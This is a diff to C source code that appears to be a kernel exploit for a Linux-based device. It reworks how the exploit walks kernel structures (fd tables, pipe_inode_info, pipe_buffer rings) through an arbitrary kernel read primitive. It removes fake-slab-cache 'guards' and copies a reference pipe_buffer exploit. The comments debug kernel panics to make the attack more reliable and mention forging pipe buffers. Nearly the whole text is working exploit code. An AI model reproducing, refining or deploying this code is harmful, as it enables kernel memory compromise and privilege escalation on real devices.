@@ -1757,50 +1757,46 @@ static int walk_try_fd_pipe(int fd, uint32_t bank_index, uint32_t fdi, uintptr_t
   if (!walk_ptr_ok(pinfo)) {
     return 0;
   }
-  /* pinfo stays GUARDED. This was tested rather than assumed.
+  /* pipe_inode_info is read UNGUARDED, in small pieces, exactly as the reference does.
    *
-   * The fork reads tail/ring/bufs unguarded (09_pipe_buffer_rw.c ~line 1672). Tried
-   * that here and it HANGS: the run died with
-   * `RD target=ffffff8a362d5a60 ... len=80` and no `pread ret=` line. So on GZH2 the
-   * guard is mandatory for pinfo even though the fork does not need it on its target -
-   * a real device difference, not a porting mistake. Guarded it stays.
+   * This reverses an earlier decision in this file, and the reversal is the whole point. The
+   * comment that used to sit here claimed the guard was MANDATORY for pinfo on this device,
+   * because an unguarded read "HANGS: the run died with RD target=... len=80 and no pread
+   * ret". That inference was wrong, and it cost us the reference's reliability:
    *
-   * TWO NARROW READS INSTEAD OF ONE WIDE ONE.
-   * head@0x60, tail@0x64, ring_size@0x6c and bufs@0xa8 are spread across 0x60..0xb0, so a
-   * single batched read spans 176 bytes - and a 176-byte read of this object is what hangs.
-   * The whole run corpus says width is what matters here: 8-byte guarded reads went 3573/3573
-   * clean, while every hang was the wide pinfo read. So pay one extra guard cycle and split it
-   * into a 20-byte read (the three counters, 0x60..0x74) and an 8-byte read (bufs at 0xa8). Two
-   * narrow reads of the most reliable width on this device beat one risky one, and 2 cycles on
-   * a candidate that usually fails is a far better trade than a reboot.
+   *   - The reference never guards pinfo. Its walk calls slab_cache_guard_begin() in exactly
+   *     four places - task, task(winner), files, file - and reads pinfo and the ring
+   *     unguarded (09_pipe_buffer_rw.c:1673-1683). Its primitive, oss_kernel_read(), is the
+   *     same configfs_read_once() AAR we already have: a raw virtual-address read with no
+   *     direct_to_page() translation. FULL-EXECUTION-FLOW.md section 8 lists no guard step
+   *     for the walk at all.
+   *   - "No pread ret" plus a reboot is a kernel PANIC, not a hang. A panic is not a slow
+   *     read that a guard would fix, and no retry survives one.
+   *   - So the guard was not preventing a panic on pinfo; installing a fake slab_cache on
+   *     pinfo's page - one of the hottest pages in the system, constantly allocated and freed
+   *     - is a far better explanation for a panic than a plain read is. The window in which a
+   *     concurrent allocation is misled is exactly what we were adding on every attempt.
    *
-   * Both use PIPE_WALK_PINFO_CACHE_SIZE = 184, pinfo's own BTF sizeof(pipe_inode_info). This
-   * previously passed PIPE_WALK_FILE_CACHE_SIZE - the *file_struct* size - 136 bytes too large,
-   * and the guard works by installing a fake cache whose inuse/usersize equal this value, so
-   * every extra byte widens the window in which a concurrent allocation on that slab page is
-   * misled. Both spans sit well inside 184. */
-  const uintptr_t counter_offs[3] = {PIPE_WALK_PIPE_HEAD_OFF, PIPE_WALK_PIPE_TAIL_OFF,
-                                     PIPE_WALK_PIPE_RING_OFF};
-  uint64_t pi[4] = {0, 0, 0, 0};
-  if (!walk_read_fields(fd, pinfo, PIPE_WALK_PINFO_CACHE_SIZE, counter_offs, 3, pi)) {
-    g_guard_read_failures++;
-    rmg_diag("WALK guarded pipe_inode_info counters read failed at fd=%u latch=%d "
-             "(skipping fd)\n",
-             fdi, atomic_load(&g_io_restore_failed));
+   * Width is not the discriminator either: 8-byte guarded reads went 3573/3573 clean while
+   * the 20-byte pinfo read still panicked, so narrowing the guarded read bought nothing.
+   *
+   * Do not reintroduce a guard here. If pinfo ever fails to read, the correct responses are
+   * the reference's: skip this fd (continue) and let the bounded 12-attempt walk ladder
+   * re-run with a fresh pipe bank. */
+  uint32_t head = 0, tail = 0, ring = 0;
+  uint64_t bufs = 0;
+  if (kernel_read_data(fd, pinfo + PIPE_WALK_PIPE_HEAD_OFF, &head, sizeof(head)) !=
+          (ssize_t)sizeof(head) ||
+      kernel_read_data(fd, pinfo + PIPE_WALK_PIPE_TAIL_OFF, &tail, sizeof(tail)) !=
+          (ssize_t)sizeof(tail) ||
+      kernel_read_data(fd, pinfo + PIPE_WALK_PIPE_RING_OFF, &ring, sizeof(ring)) !=
+          (ssize_t)sizeof(ring) ||
+      kernel_read_data(fd, pinfo + PIPE_WALK_PIPE_BUFS_OFF, &bufs, sizeof(bufs)) !=
+          (ssize_t)sizeof(bufs)) {
+    rmg_diag("WALK fd=%u pipe_inode_info read failed (skipping fd)\n", fdi);
     return 0;
   }
-  const uintptr_t bufs_offs[1] = {PIPE_WALK_PIPE_BUFS_OFF};
-  if (!walk_read_fields(fd, pinfo, PIPE_WALK_PINFO_CACHE_SIZE, bufs_offs, 1, &pi[3])) {
-    g_guard_read_failures++;
-    rmg_diag("WALK guarded pipe_inode_info bufs read failed at fd=%u latch=%d "
-             "(skipping fd)\n",
-             fdi, atomic_load(&g_io_restore_failed));
-    return 0;
-  }
-  uint32_t head = (uint32_t)pi[0];
-  uint32_t tail = (uint32_t)pi[1];
-  uint32_t ring = (uint32_t)pi[2];
-  uintptr_t bufs = (uintptr_t)pi[3];
+  uintptr_t bufs_ptr = (uintptr_t)bufs;
   /* head/tail are UNMASKED monotonic counters in Linux - they are never reduced mod
    * ring_size, they just wrap naturally and are masked only at dereference
    * (fs/pipe.c:61-66, "we use head and tail indices that aren't masked off, except at the
@@ -1856,32 +1852,37 @@ static int walk_try_fd_pipe(int fd, uint32_t bank_index, uint32_t fdi, uintptr_t
    * released buffer we must not forge. */
   for (uint32_t idx = live; idx == live && !found; idx++) {
     uintptr_t pb_addr = bufs + (size_t)idx * PIPE_WALK_PIPE_BUF_STRIDE;
-    uintptr_t chunk_base = pb_addr & ~(uintptr_t)(chunk - 1);
-    size_t off = (size_t)(pb_addr - chunk_base) / 8; /* in qwords */
-    if ((off + PIPE_WALK_PIPE_BUF_STRIDE / 8) > chunk_words) {
-      continue;
-    }
-    if (!walk_read_chunk_qword(fd, chunk_base, pagebuf, chunk_words,
-                               (uint32_t)chunk)) {
-      rmg_diag("WALK ring chunk read failed fd=%u chunk=%016zx latch=%d\n", fdi,
-               chunk_base, atomic_load(&g_io_restore_failed));
+    /* Read ONLY this one pipe_buffer, UNGUARDED - the reference does exactly this
+     * (09_pipe_buffer_rw.c:1686-1688: oss_kernel_read of one struct oss_pipe_buffer at
+     * bufs + (tail & (ring-1)) * stride). We were instead reading a whole PIPE_WALK_SCAN_CHUNK
+     * (0x400) under a guard sized to that chunk, i.e. installing a fake cache that told the
+     * kernel each object in that page was 1024 bytes when the real objects are 40-byte
+     * pipe_buffers. That is precisely the "one oversized value left reads marginal" hazard:
+     * every concurrent slab_free/slab_alloc on that page does arithmetic against the fake
+     * size. It also cost a guard cycle to obtain 40 useful bytes.
+     *
+     * pipe_buffer is 0x28: page +0x00, offset +0x08, len +0x0c, ops +0x10, flags +0x18,
+     * private +0x20. */
+    uint8_t pb_bytes[PIPE_WALK_PIPE_BUF_STRIDE];
+    memset(pb_bytes, 0, sizeof(pb_bytes));
+    if (kernel_read_data(fd, pb_addr, pb_bytes, sizeof(pb_bytes)) !=
+        (ssize_t)sizeof(pb_bytes)) {
+      rmg_diag("WALK ring buffer read failed fd=%u pb=%016zx errno=%d\n", fdi, pb_addr, errno);
       break;
     }
     /* The fork's is_structural_pipe_candidate() (09_pipe_buffer_rw.c:1092-1099) requires all
      * six. We previously checked only two of them, which is why a released descriptor could
-     * pass. pipe_buffer is 0x28: page +0, offset +8, len +0xc, ops +0x10, flags +0x18,
-     * private +0x20.
+     * pass.
      *
-     * offset and len are two u32 that SHARE one qword: q1 = (u64)len << 32 | offset. So
-     * `off + 0x0c / 8` is `off + 1`, the same qword as offset, and its LOW half is offset -
-     * reading len from there made blen alias boff, and the `blen == 0` test then rejected
-     * every candidate, which is exactly where the walk stalled. len is the HIGH half. */
-    uint64_t page = pagebuf[off + 0];
-    uint32_t boff = (uint32_t)pagebuf[off + 1];
-    uint32_t blen = (uint32_t)(pagebuf[off + 1] >> 32);
-    uint64_t ops = pagebuf[off + 0x10 / 8];
-    uint32_t bflags = (uint32_t)pagebuf[off + 0x18 / 8];
-    uint64_t bpriv = pagebuf[off + 0x20 / 8];
+     * offset and len are two u32 that SHARE one qword, so read that qword once and split it
+     * rather than loading the halves independently. */
+    uint64_t page; uint32_t boff; uint32_t blen; uint64_t ops; uint32_t bflags; uint64_t bpriv;
+    memcpy(&page, pb_bytes + 0x00, 8);
+    { uint64_t off_len; memcpy(&off_len, pb_bytes + 0x08, 8);
+      boff = (uint32_t)off_len; blen = (uint32_t)(off_len >> 32); }
+    memcpy(&ops, pb_bytes + 0x10, 8);
+    { uint32_t f; memcpy(&f, pb_bytes + 0x18, 4); bflags = f; }
+    memcpy(&bpriv, pb_bytes + 0x20, 8);
     if (ops != anon_ops) {
       continue;
     }
@@ -2069,17 +2070,17 @@ static int pipe_walk_resolve_pass(int fd) {
   if (!fdbuf) {
     return 0;
   }
-  struct slab_cache_guard fdg;
-  if (!slab_cache_guard_begin(fd, fd_array, (uint32_t)span, &fdg)) {
-    g_guard_read_failures++;
-    rmg_diag("WALK fd_array guard begin failed latch=%d\n",
-             atomic_load(&g_io_restore_failed));
-    free(fdbuf);
-    return 0;
-  }
-  ssize_t fgot = configfs_read_once(fd, fd_array, fdbuf, span);
-  int fdrestored = slab_cache_guard_end(fd, &fdg);
-  rmg_diag("WALK fdtable span read ret=%zd want=%zu restored=%d\n", fgot, want, fdrestored);
+  /* fd_array is read UNGUARDED, as the reference does.
+   *
+   * The reference's read_pipe_file_table() walks the fd table with plain oss_kernel_read
+   * calls and arms nothing for it; its only guards are task (x2), files and file. We were
+   * guarding the fd_array with a cache sized to the whole span (up to PIPE_WALK_MAX_SPAN
+   * bytes), which again tells the kernel its objects are far larger than the real
+   * fdtable-page objects. Unguard it - one less exposure window, and it costs nothing
+   * because the guard was not what made the read succeed. */
+  ssize_t fgot = kernel_read_data(fd, fd_array, fdbuf, span);
+  int fdrestored = 1;
+  rmg_diag("WALK fdtable span read ret=%zd want=%zu (unguarded)\n", fgot, want);
   if (!fdrestored) {
     rmg_diag("WALK terminal: fd_array restore failed\n");
     free(fdbuf);
